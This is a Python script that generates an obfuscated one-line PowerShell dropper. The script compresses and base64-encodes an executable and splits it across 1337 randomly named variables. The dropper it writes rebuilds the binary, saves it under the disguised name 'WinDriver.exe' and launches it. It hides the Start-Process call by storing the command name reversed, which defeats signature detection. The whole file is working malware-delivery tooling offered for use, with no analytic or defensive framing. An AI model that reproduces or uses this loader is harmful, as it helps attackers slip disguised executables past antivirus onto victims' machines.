#!/usr/bin/env python3
import os
import gzip
import base64
import textwrap
import random
import string

def get_random_name(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def encode_and_split(data: bytes, num_parts: int):
  comp = gzip.compress(data)
  b64 = base64.b64encode(comp).decode('ascii')
  part_len = len(b64) // num_parts
  parts = [ b64[i*part_len : (i+1)*part_len] for i in range(num_parts) ]
  if len(b64) % num_parts:
    parts[-1] += b64[num_parts*part_len:]
  return parts

def generate_loader_multi_parts(output_path, exe_path, num_parts, exe_name="WinDriver.exe"):
  with open(exe_path, 'rb') as f:
    exe_bytes = f.read()
  exe_parts = encode_and_split(exe_bytes, num_parts)

  part_variable_names = [get_random_name() for _ in range(len(exe_parts))]

  # --- NEW: Build the entire script in a list first ---
  script_parts = []

  # 1. Add the variable definitions for each part
  for i, part in enumerate(exe_parts):
    # Use single quotes for safety in a one-liner
    script_parts.append(f"${part_variable_names[i]}='{part}';")

  # 2. Add the array definition
  ps_array_of_names = ", ".join([f"'{name}'" for name in part_variable_names])
  script_parts.append(f"$haalloobim=@({ps_array_of_names});")

  # 3. Define the main logic block
  cmd_to_run_rev = 'ssecorP-tratS'
  main_logic = r'''
$jjcho = "";foreach ($winter in $haalloobim) {$jjcho += (Get-Variable -Name $winter -ValueOnly)};$mirai = [System.Convert]::FromBase64String($jjcho);$daffainfo = New-Object IO.MemoryStream(, $mirai);$hygge = New-Object IO.Compression.GzipStream($daffainfo, [IO.Compression.CompressionMode]::Decompress);$rootkids = New-Object IO.MemoryStream;$hygge.CopyTo($rootkids);$hygge.Dispose(); $daffainfo.Dispose();$djumanto = $rootkids.ToArray(); $rootkids.Dispose();$hanz = (Get-Location).Path;$revprm = Join-Path $hanz "''' + exe_name + r'''";[IO.File]::WriteAllBytes($revprm, $djumanto);$etern1tydark = "''' + cmd_to_run_rev + r'''";$requiiem = $etern1tydark[-1..-($etern1tydark.Length)] -join '';& $requiiem -FilePath $revprm
'''
  # 4. Clean the logic block and add it to our list
  script_parts.append(main_logic.replace('\n', '').replace('\r', ''))

  # --- NEW: Join all parts and write to the file in a single operation ---
  final_script = "".join(script_parts)
  with open(output_path, 'w', encoding='utf-8') as out:
    out.write(final_script)

  print(f"One-line loader script generated: {output_path}")

if __name__ == "__main__":
  generate_loader_multi_parts("awikwok.ps1", "Meddle.exe", num_parts=1337, exe_name="WinDriver.exe")